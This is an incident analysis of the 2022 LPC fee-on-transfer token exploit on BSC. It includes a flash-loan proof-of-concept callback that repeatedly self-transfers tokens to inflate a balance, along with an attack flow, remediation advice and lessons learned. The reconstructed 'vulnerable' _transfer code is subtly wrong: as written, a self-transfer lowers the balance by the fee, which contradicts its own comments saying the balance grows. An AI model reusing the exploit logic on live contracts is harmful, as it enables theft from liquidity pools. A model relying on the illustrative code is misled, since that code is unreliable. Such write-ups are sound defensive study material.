# LPC — Fee Token Self-Transfer Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2022-07-25 |
| **Protocol** | LPC Token |
| **Chain** | BSC |
| **Loss** | 178 BNB (~$45,715) |
| **Attacker** | [0xd9936EA9...](https://bscscan.com/address/0xd9936EA91a461aA4B727a7e3661bcD6cD257481c) |
| **Attack Tx** | [0x0e970ed8...](https://bscscan.com/tx/0x0e970ed84424d8ea51f6460ce6105ab68441d4450a80bc8d749fdf01e504ed8c) |
| **Vulnerable Contract** | [0x1e813fA0...](https://bscscan.com/address/0x1e813fa05739bf145c1f182cb950da7af046778d) |
| **Root Cause** | Balance infinite-growth bug when fee token `transfer()` is called with self as recipient |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-07/LPC_exp.sol) |

---
## 1. Vulnerability Overview

LPC token is a fee-on-transfer token that charges a fee on every transfer. However, there is a flaw in the fee-handling logic when transferring to oneself (self-transfer), causing the balance to increase with each repeated call. The attacker flash-loaned a large amount of LPC, performed 10 repeated self-transfers to inflate their balance, then realized the profit.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code — no self-transfer handling
function _transfer(address from, address to, uint256 amount) internal {
    uint256 fee = amount * feeRate / 10000;
    uint256 netAmount = amount - fee;

    _balances[from] -= amount;  // deduct from sender balance
    _balances[to] += netAmount; // increase recipient balance (fee excluded)

    // When self-transfer (from == to):
    // from balance: deducted by amount
    // to balance: increased by netAmount
    // Result: balance increases by fee! (balance grows with every self-transfer)
}

// ✅ Fixed code
function _transfer(address from, address to, uint256 amount) internal {
    require(from != to, "Self-transfer not allowed"); // block self-transfer
    // or
    if (from == to) return; // ignore self-transfer
}
```

### On-chain Source Code

Source: bytecode decompile


**LPC_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: balance infinite-growth bug when fee token `transfer()` is called with self as recipient
    function transfer(address arg0, uint256 arg1) external {}  // 0xa9059cbb  // ❌ vulnerability
```

**Decompiled_0x1e813fa0.sol** — related contract:
```solidity
// ❌ Root cause: balance infinite-growth bug when fee token `transfer()` is called with self as recipient
    function transfer_attention_tg_invmru_6e7aa58(bool arg0, address arg1, address arg2) external {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1] Flash loan from PancakeSwap (full LPC reserve)
  │      └─ pancakeCall() callback executed
  │
  ├─[2] Inside flash loan callback:
  │      ├─ Check LPC balance
  │      └─ 10x repeated self-transfer
  │           IERC20(LPC).transfer(address(this), LPC_balance)
  │           balance increases with each iteration
  │
  ├─[3] Repay flash loan (principal + fee)
  │
  └─[4] Swap remaining LPC for USDT to realize profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    // Check LPC balance borrowed via flash loan
    uint256 LPC_balance = IERC20(LPC).balanceOf(address(this));

    // [Core vulnerability exploitation] 10x repeated self-transfer
    // Each transfer leaves the fee in the balance, growing total balance
    for (uint8 i; i < 10; ++i) {
        IERC20(LPC).transfer(address(this), LPC_balance);
        // balance after self-transfer > previous balance (increases by fee amount)
    }

    // Repay flash loan (principal + 10% fee)
    uint256 paybackAmount = amount0 / 90 / 100 * 10_000;
    IERC20(LPC).transfer(address(pancakePair), paybackAmount);

    // Obtain USDT with remaining LPC (separate transaction)
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **CWE** | CWE-682: Incorrect Calculation |
| **Vulnerability Type** | Fee Token Logic Flaw |
| **Attack Type** | Flash loan + self-transfer balance manipulation |
| **Impact** | Token inflation, liquidity pool fund loss |
| **CVSS Score** | 7.5 (High) |

## 6. Remediation Recommendations

1. **Block self-transfers**: Add `require(from != to)` condition
2. **Validate fee calculation logic**: Write unit tests for self-transfer edge cases
3. **Flash loan defense**: Set intra-block balance change limits

## 7. Lessons Learned

- **Complexity of fee-on-transfer tokens**: Fee tokens behave differently from standard ERC20 tokens, so all edge cases must be thoroughly tested.
- **Self-transfer edge case**: Failing to explicitly handle the `from == to` case can lead to unexpected outcomes.
- **Flash loan amplification effect**: Even a minor vulnerability can result in large-scale damage when combined with flash loans.